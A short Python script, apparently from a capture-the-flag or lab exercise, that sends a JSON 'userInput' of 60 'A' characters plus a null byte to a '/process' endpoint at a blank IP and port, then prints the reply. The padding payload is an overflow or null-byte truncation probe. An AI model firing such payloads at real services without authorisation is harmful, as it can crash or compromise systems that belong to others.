import requests

IP = ""
PORT = ""
url = f"http://{IP}:{PORT}/process"

payload = "A" * 60 + "\x00"

data = {"userInput": payload}

response = requests.post(url, json=data)

print("Response status code:", response.status_code)
print("Response content:", response.text)